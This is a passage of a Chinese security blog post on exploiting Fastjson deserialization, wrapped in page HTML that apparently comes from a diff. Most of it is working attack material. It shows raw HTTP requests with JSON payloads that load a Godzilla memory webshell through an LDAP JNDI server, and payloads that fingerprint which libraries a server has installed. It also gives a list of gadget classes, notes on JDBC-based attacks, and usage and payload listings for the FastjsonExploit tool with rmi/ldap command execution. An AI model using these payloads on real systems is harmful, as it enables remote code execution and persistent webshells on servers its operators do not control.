+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">POST</span> <span class="err">/json</span> <span class="err">HTTP/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="err">Host:</span> <span class="mf">192.168</span><span class="err">.</span><span class="mf">165.252</span><span class="err">:</span><span class="mi">8088</span>
+</span></span><span class="line"><span class="cl"><span class="err">User-Agent:</span> <span class="err">Mozilla/</span><span class="mf">5.0</span> <span class="err">(Windows</span> <span class="err">NT</span> <span class="mf">10.0</span><span class="err">;</span> <span class="err">Win</span><span class="mi">64</span><span class="err">;</span> <span class="err">x</span><span class="mi">64</span><span class="err">;</span> <span class="err">rv:</span><span class="mf">138.0</span><span class="err">)</span> <span class="err">Gecko/</span><span class="mi">20100101</span> <span class="err">Firefox/</span><span class="mf">138.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">Accept:</span> <span class="err">text/html,application/xhtml+xml,application/xml;q=</span><span class="mf">0.9</span><span class="err">,*/*;q=</span><span class="mf">0.8</span>
+</span></span><span class="line"><span class="cl"><span class="err">Accept-Language:</span> <span class="err">zh-CN,zh;q=</span><span class="mf">0.8</span><span class="err">,zh-TW;q=</span><span class="mf">0.7</span><span class="err">,zh-HK;q=</span><span class="mf">0.5</span><span class="err">,en-US;q=</span><span class="mf">0.3</span><span class="err">,en;q=</span><span class="mf">0.2</span>
+</span></span><span class="line"><span class="cl"><span class="err">Accept-Encoding:</span> <span class="err">gzip,</span> <span class="err">deflate,</span> <span class="err">br</span>
+</span></span><span class="line"><span class="cl"><span class="err">Connection:</span> <span class="err">close</span>
+</span></span><span class="line"><span class="cl"><span class="err">Cookie:</span> <span class="err">Hm_lvt_</span><span class="mi">1</span><span class="err">cd</span><span class="mi">9</span><span class="err">bcbaae</span><span class="mi">133</span><span class="err">f</span><span class="mi">03</span><span class="err">a</span><span class="mi">6</span><span class="err">eb</span><span class="mi">19</span><span class="err">da</span><span class="mi">6579</span><span class="err">aaba=</span><span class="mi">1748439476</span><span class="err">;</span> <span class="err">JSESSIONID=FB</span><span class="mi">191</span><span class="err">FA</span><span class="mi">4</span><span class="err">A</span><span class="mi">87502</span><span class="err">B</span><span class="mi">1</span><span class="err">D</span><span class="mi">47</span><span class="err">A</span><span class="mi">0</span><span class="err">EF</span><span class="mi">7</span><span class="err">BFEEDCB</span><span class="mi">2</span>
+</span></span><span class="line"><span class="cl"><span class="err">Upgrade-Insecure-Requests:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="err">Priority:</span> <span class="err">u=</span><span class="mi">0</span><span class="err">,</span> <span class="err">i</span>
+</span></span><span class="line"><span class="cl"><span class="err">Content-Type:</span> <span class="err">application/json</span>
+</span></span><span class="line"><span class="cl"><span class="err">Content-Length:</span> <span class="mi">187</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;org.apache.shiro.jndi.JndiObjectFactory&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;resourceName&#34;</span><span class="p">:</span> <span class="s2">&#34;ldap://192.168.165.252:1389/TomcatBypass/GodzillaMemshell&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;instance&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;$ref&#34;</span><span class="p">:</span> <span class="s2">&#34;$.instance&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="55fastjson1268版本利用">5.5.FastJson&lt;=1.2.68版本利用
+</h3><p><strong>这个大版本下，可以使用jdbc反序列化简单粗暴通杀</strong></p>
+<p>**可反序列化版本：**5.1.11-5.1.48，6.0.2-6.0.3，8.0.19</p>
+<p><strong>可ssrf版本：5.0.2-5.1.5，5.1.1-5.1.49，&gt;8.0.19</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="err">&lt;groupId&gt;mysql&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="err">&lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">	<span class="err">&lt;version&gt;</span><span class="mf">5.1</span><span class="err">.</span><span class="mi">30</span><span class="err">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="err">&lt;/dependency&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>测试比较通用的方法：利用Character转换报错，探测版本</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">POST</span> <span class="err">/json</span> <span class="err">HTTP/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="err">Host:</span> <span class="mf">192.168</span><span class="err">.</span><span class="mf">0.105</span><span class="err">:</span><span class="mi">8088</span>
+</span></span><span class="line"><span class="cl"><span class="err">User-Agent:</span> <span class="err">Mozilla/</span><span class="mf">5.0</span> <span class="err">(Windows</span> <span class="err">NT</span> <span class="mf">10.0</span><span class="err">;</span> <span class="err">Win</span><span class="mi">64</span><span class="err">;</span> <span class="err">x</span><span class="mi">64</span><span class="err">;</span> <span class="err">rv:</span><span class="mf">139.0</span><span class="err">)</span> <span class="err">Gecko/</span><span class="mi">20100101</span> <span class="err">Firefox/</span><span class="mf">139.0</span>
+</span></span><span class="line"><span class="cl"><span class="err">Accept:</span> <span class="err">text/html,application/xhtml+xml,application/xml;q=</span><span class="mf">0.9</span><span class="err">,*/*;q=</span><span class="mf">0.8</span>
+</span></span><span class="line"><span class="cl"><span class="err">Accept-Language:</span> <span class="err">zh-CN,zh;q=</span><span class="mf">0.8</span><span class="err">,zh-TW;q=</span><span class="mf">0.7</span><span class="err">,zh-HK;q=</span><span class="mf">0.5</span><span class="err">,en-US;q=</span><span class="mf">0.3</span><span class="err">,en;q=</span><span class="mf">0.2</span>
+</span></span><span class="line"><span class="cl"><span class="err">Accept-Encoding:</span> <span class="err">gzip,</span> <span class="err">deflate,</span> <span class="err">br</span>
+</span></span><span class="line"><span class="cl"><span class="err">Connection:</span> <span class="err">close</span>
+</span></span><span class="line"><span class="cl"><span class="err">Upgrade-Insecure-Requests:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="err">Priority:</span> <span class="err">u=</span><span class="mi">0</span><span class="err">,</span> <span class="err">i</span>
+</span></span><span class="line"><span class="cl"><span class="err">Content-Type:</span> <span class="err">application/json</span>
+</span></span><span class="line"><span class="cl"><span class="err">Content-Length:</span> <span class="mi">117</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;x&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.Character&#34;</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;@type&#34;</span><span class="p">:</span> <span class="s2">&#34;java.lang.Class&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;val&#34;</span><span class="p">:</span> <span class="s2">&#34;com.mysql.jdbc.Buffer&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>探测别的版本</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">org.springframework.web.bind.annotation.RequestMapping</span>  <span class="c1">//SpringBoot
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">org.apache.catalina.startup.Tomcat</span>  <span class="c1">//Tomcat
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">groovy.lang.GroovyShell</span>  <span class="c1">//Groovy - 1.2.80
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">com.mchange.v</span><span class="mi">2</span><span class="err">.c</span><span class="mi">3</span><span class="err">p</span><span class="mi">0</span><span class="err">.DataSources</span>  <span class="c1">//C3P0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">com.mysql.jdbc.Buffer</span>  <span class="c1">//mysql-jdbc-5
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">com.mysql.cj.api.authentication.AuthenticationProvider</span>  <span class="c1">//mysql-connect-6
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">com.mysql.cj.protocol.AuthenticationProvider</span> <span class="c1">//mysql-connect-8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">sun.nio.cs.GBK</span>  <span class="c1">//JDK8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">java.net.http.HttpClient</span>  <span class="c1">//JDK11
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">org.apache.ibatis.type.Alias</span>  <span class="c1">//Mybatis
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">org.apache.tomcat.dbcp.dbcp.BasicDataSource</span>  <span class="c1">//tomcat-dbcp-7-BCEL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">org.apache.tomcat.dbcp.dbcp</span><span class="mi">2</span><span class="err">.BasicDataSource</span> <span class="c1">//tomcat-dbcp-8及以后-BCEL
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">org.apache.commons.io.Charsets</span>       <span class="c1">// 存在commons-io,但不确定版本
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">org.apache.commons.io.file.Counters</span>  <span class="c1">//commons-io-2.7-2.8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">org.aspectj.ajde.Ajde</span>  <span class="c1">//aspectjtools
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="56不出网利用">5.6.不出网利用
+</h3><p><strong>利用BCEL不出网打内存马</strong></p>
+<p><a class="link" href="https://blog.csdn.net/2201_75353421/article/details/132077531"  target="_blank" rel="noopener"
+    >利用BCEL打fastjson直接burp回显getshell_fastjson回显-CSDN博客</a></p>
+<h2 id="7悟空crm-fastjson反序列化漏洞">7.悟空CRM-FastJson反序列化漏洞
+</h2><p><a class="link" href="https://blog.csdn.net/weixin_56039103/article/details/116799511"  target="_blank" rel="noopener"
+    >错误解决——搭建悟空crm9项目运行环境过程中遇到的一些问题和错误解决办法_悟空crm审核报网络错误-CSDN博客</a></p>
+<h2 id="8fastjsonexploit">8.FastjsonExploit
+</h2><p><a class="link" href="https://github.com/c0ny1/FastjsonExploit"  target="_blank" rel="noopener"
+    >https://github.com/c0ny1/FastjsonExploit</a></p>
+<p><strong><font style="color:rgb(36, 64, 179);">FastjsonExploit </font></strong><font style="color:rgb(51, 51, 51);">‌是一个专门针对</font><font style="color:rgb(36, 64, 179);"> Fastjson库 </font><font style="color:rgb(51, 51, 51);">的安全漏洞进行检测和利用的工具，由</font><font style="color:rgb(36, 64, 179);"> c0ny1 </font><font style="color:rgb(51, 51, 51);">开发。该工具的主要功能包括一键生成利用payload、管理Fastjson的各种payload、模拟攻击者的行为进行安全测试等‌</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">java</span> <span class="err">-jar</span> <span class="err">FastjsonExploit-</span><span class="p">[</span><span class="err">version</span><span class="p">]</span><span class="err">.jar</span> <span class="p">[</span><span class="err">payload</span><span class="p">]</span> <span class="p">[</span><span class="err">option</span><span class="p">]</span> <span class="p">[</span><span class="err">command</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">java</span> <span class="err">-jar</span> <span class="err">FastjsonExploit-</span><span class="p">[</span><span class="err">version</span><span class="p">]</span><span class="err">.jar</span> <span class="err">JdbcRowSetImpl</span><span class="mi">1</span> <span class="err">rmi:</span><span class="c1">//127.0.0.1:1099/Exploit &#34;cmd:calc&#34;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">D:\Java_Project\JavaSec\Fastjson\FastjsonExploit-master\target&gt;java</span> <span class="err">-jar</span> <span class="err">FastjsonExploit</span><span class="mf">-0.1</span><span class="err">-beta</span><span class="mi">2</span><span class="err">-all.jar</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">.----</span> <span class="err">-.</span> <span class="err">-.</span> <span class="err">.</span>  <span class="err">.</span>   <span class="err">.</span>
+</span></span><span class="line"><span class="cl">   <span class="err">(</span> <span class="err">.&#39;,-----</span> <span class="err">-</span> <span class="err">-</span> <span class="err">&#39;</span> <span class="err">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">\_/</span>      <span class="err">;--:-\</span>         <span class="err">__--------------------__</span>
+</span></span><span class="line"><span class="cl">   <span class="err">__U__n_^_&#39;&#39;__</span><span class="p">[</span><span class="err">.</span> <span class="err">|ooo___</span>  <span class="err">|</span> <span class="err">|_!_||_!_||_!_||_!_|</span> <span class="err">|</span>
+</span></span><span class="line"><span class="cl"> <span class="err">c(_</span> <span class="err">..(_</span> <span class="err">..(_</span> <span class="err">..(</span> <span class="err">/</span><span class="p">,,,,,,]</span> <span class="err">|</span> <span class="err">|___||___||___||___|</span> <span class="err">|</span>
+</span></span><span class="line"><span class="cl"> <span class="err">,_\___________&#39;_|,L______],|______________________|</span>
+</span></span><span class="line"><span class="cl"><span class="err">/;_(@)(@)==(@)(@)</span>   <span class="err">(o)(o)</span>      <span class="err">(o)^(o)--(o)^(o)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">FastjsonExploit</span> <span class="err">is</span> <span class="err">a</span> <span class="err">Fastjson</span> <span class="err">library</span> <span class="err">vulnerability</span> <span class="err">exploit</span> <span class="err">framework</span>
+</span></span><span class="line"><span class="cl">                <span class="err">Author:c</span><span class="mi">0</span><span class="err">ny</span><span class="mi">1</span><span class="err">&lt;root@gv</span><span class="mi">7</span><span class="err">.me&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">Usage:</span> <span class="err">java</span> <span class="err">-jar</span> <span class="err">Fastjson-</span><span class="p">[</span><span class="err">version</span><span class="p">]</span><span class="err">-all.jar</span> <span class="p">[</span><span class="err">payload</span><span class="p">]</span> <span class="p">[</span><span class="err">option</span><span class="p">]</span> <span class="p">[</span><span class="err">command</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">Exp</span><span class="mi">01</span><span class="err">:</span> <span class="err">java</span> <span class="err">-jar</span> <span class="err">FastjsonExploit-</span><span class="p">[</span><span class="err">version</span><span class="p">]</span><span class="err">.jar</span> <span class="err">JdbcRowSetImpl</span><span class="mi">1</span> <span class="err">rmi:</span><span class="c1">//127.0.0.1:1099/Exploit &#34;cmd:calc&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">Exp</span><span class="mi">02</span><span class="err">:</span> <span class="err">java</span> <span class="err">-jar</span> <span class="err">FastjsonExploit-</span><span class="p">[</span><span class="err">version</span><span class="p">]</span><span class="err">.jar</span> <span class="err">JdbcRowSetImpl</span><span class="mi">1</span> <span class="err">ldap:</span><span class="c1">//127.0.0.1:1232/Exploit &#34;code:custom_code.java&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">Exp</span><span class="mi">03</span><span class="err">:</span> <span class="err">java</span> <span class="err">-jar</span> <span class="err">FastjsonExploit-</span><span class="p">[</span><span class="err">version</span><span class="p">]</span><span class="err">.jar</span> <span class="err">TemplatesImpl</span><span class="mi">1</span> <span class="s2">&#34;cmd:calc&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="err">Exp</span><span class="mi">04</span><span class="err">:</span> <span class="err">java</span> <span class="err">-jar</span> <span class="err">FastjsonExploit-</span><span class="p">[</span><span class="err">version</span><span class="p">]</span><span class="err">.jar</span> <span class="err">TemplatesImpl</span><span class="mi">1</span> <span class="s2">&#34;code:custom_code.java&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">Available</span> <span class="err">payload</span> <span class="err">types:</span>
+</span></span><span class="line"><span class="cl">    <span class="err">Payload</span>                <span class="err">PayloadType</span> <span class="err">VulVersion</span>      <span class="err">Dependencies</span>
+</span></span><span class="line"><span class="cl">    <span class="err">-------</span>                <span class="err">-----------</span> <span class="err">----------</span>      <span class="err">------------</span>
+</span></span><span class="line"><span class="cl">    <span class="err">BasicDataSource</span><span class="mi">1</span>       <span class="err">local</span>       <span class="mf">1.2</span><span class="err">.</span><span class="mf">2.1-1.2</span><span class="err">.</span><span class="mf">2.4</span> <span class="err">tomcat-dbcp:</span><span class="mi">7</span><span class="err">.x,</span> <span class="err">tomcat-dbcp:</span><span class="mi">9</span><span class="err">.x,</span> <span class="err">commons-dbcp:</span><span class="mf">1.4</span>
+</span></span><span class="line"><span class="cl">    <span class="err">BasicDataSource</span><span class="mi">2</span>       <span class="err">local</span>       <span class="mf">1.2</span><span class="err">.</span><span class="mf">2.1-1.2</span><span class="err">.</span><span class="mf">2.4</span> <span class="err">tomcat-dbcp:</span><span class="mi">7</span><span class="err">.x,</span> <span class="err">tomcat-dbcp:</span><span class="mi">9</span><span class="err">.x,</span> <span class="err">commons-dbcp:</span><span class="mf">1.4</span>
+</span></span><span class="line"><span class="cl">    <span class="err">JdbcRowSetImpl</span><span class="mi">1</span>        <span class="err">jndi</span>        <span class="mf">1.2</span><span class="err">.</span><span class="mf">2.1-1.2</span><span class="err">.</span><span class="mf">2.4</span>
+</span></span><span class="line"><span class="cl">    <span class="err">JdbcRowSetImpl</span><span class="mi">2</span>        <span class="err">jndi</span>        <span class="mf">1.2</span><span class="err">.</span><span class="mf">2.1-1.2</span><span class="err">.</span><span class="mf">4.1</span> <span class="err">Fastjson</span> <span class="mf">1.2</span><span class="err">.</span><span class="mi">41</span> <span class="err">bypass</span>
+</span></span><span class="line"><span class="cl">    <span class="err">JdbcRowSetImpl</span><span class="mi">3</span>        <span class="err">jndi</span>        <span class="mf">1.2</span><span class="err">.</span><span class="mf">2.1-1.2</span><span class="err">.</span><span class="mf">4.3</span> <span class="err">Fastjson</span> <span class="mf">1.2</span><span class="err">.</span><span class="mi">43</span> <span class="err">bypass</span>
+</span></span><span class="line"><span class="cl">    <span class="err">JdbcRowSetImpl</span><span class="mi">4</span>        <span class="err">jndi</span>        <span class="mf">1.2</span><span class="err">.</span><span class="mf">2.1-1.2</span><span class="err">.</span><span class="mf">4.2</span> <span class="err">Fastjson</span> <span class="mf">1.2</span><span class="err">.</span><span class="mi">42</span> <span class="err">bypass</span>
+</span></span><span class="line"><span class="cl">    <span class="err">JdbcRowSetImpl</span><span class="mi">5</span>        <span class="err">jndi</span>        <span class="mf">1.2</span><span class="err">.</span><span class="mf">2.1-1.2</span><span class="err">.</span><span class="mf">4.7</span> <span class="err">Fastjson</span> <span class="mf">1.2</span><span class="err">.</span><span class="mi">47</span> <span class="err">bypass</span>
+</span></span><span class="line"><span class="cl">    <span class="err">JndiDataSourceFactory</span><span class="mi">1</span> <span class="err">jndi</span>        <span class="mf">1.2</span><span class="err">.</span><span class="mf">2.1-1.2</span><span class="err">.</span><span class="mf">2.4</span> <span class="err">ibatis-core:</span><span class="mf">3.0</span>
+</span></span><span class="line"><span class="cl">    <span class="err">SimpleJndiBeanFactory</span><span class="mi">1</span> <span class="err">jndi</span>        <span class="mf">1.2</span><span class="err">.</span><span class="mf">2.2-1.2</span><span class="err">.</span><span class="mf">2.4</span> <span class="err">spring-context:</span><span class="mf">4.3</span><span class="err">.</span><span class="mi">7</span><span class="err">.RELEASE</span>
+</span></span><span class="line"><span class="cl">    <span class="err">TemplatesImpl</span><span class="mi">1</span>         <span class="err">local</span>       <span class="mf">1.2</span><span class="err">.</span><span class="mf">2.1-1.2</span><span class="err">.</span><span class="mf">2.4</span> <span class="err">xalan:</span><span class="mf">2.7</span><span class="err">.</span><span class="mi">2</span><span class="err">(need</span> <span class="err">Feature.SupportNonPublicField)</span>
+</span></span><span class="line"><span class="cl">    <span class="err">TemplatesImpl</span><span class="mi">2</span>         <span class="err">local</span>       <span class="mf">1.2</span><span class="err">.</span><span class="mf">2.1-1.2</span><span class="err">.</span><span class="mf">2.4</span> <span class="err">xalan:</span><span class="mf">2.7</span><span class="err">.</span><span class="mi">2</span><span class="err">(need</span> <span class="err">Feature.SupportNonPublicField)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Aug 15, 2025 17:14 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A8%A1%E6%9D%BF%E5%AE%89%E5%85%A8ssti%E6%BC%8F%E6%B4%9E/logo.1eaa7543bc50eaffd5fc10a46ba6c8a8_hu_92266fad7af0c1c2.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Java代码审计模板安全SSTI漏洞"
+                        
+                        data-hash="md5-Hqp1Q7xQ6v/V/BCka6bIqA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Java代码审计模板安全SSTI漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+            <div class="article-image">
+                <img src="/p/log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/log4j.9c2086567b12e85d6f168b96609be169_hu_95a73b7e88de438a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Log4j反序列化"
+                        
+                        data-hash="md5-nCCGVnsS6F1vFouWYJvhaQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Log4j反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+        
+        
+            <div class="article-image">
+                <img src="/p/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Shiro.cb9a652dbd8b741f354c244687ea7687_hu_829ecce2c1a08e9c.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Shiro反序列化"
+                        
+                        data-hash="md5-y5plLb2LdB81TCRGh&#43;p2hw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Shiro反序列化</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/java%E5%8F%8D%E5%B0%84/">
+        
+        
+            <div class="article-image">
+                <img src="/p/java%E5%8F%8D%E5%B0%84/logo.7fcbe6004ffe9c454ad90a0e044fe3a1_hu_4a95dbe442afaa0a.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Java反射"
+                        
+                        data-hash="md5-f8vmAE/&#43;nEVK2QoOBE/joQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Java反射</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">
+        
+        
+            <div class="article-image">
+                <img src="/p/windows%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/2.0545eed92af73300cac3dc878e1aa0fe_hu_f51d45d9e0a593e8.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Windows日志分析"
+                        
+                        data-hash="md5-BUXu2Sr3MwDKw9yHjhqg/g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Windows日志分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
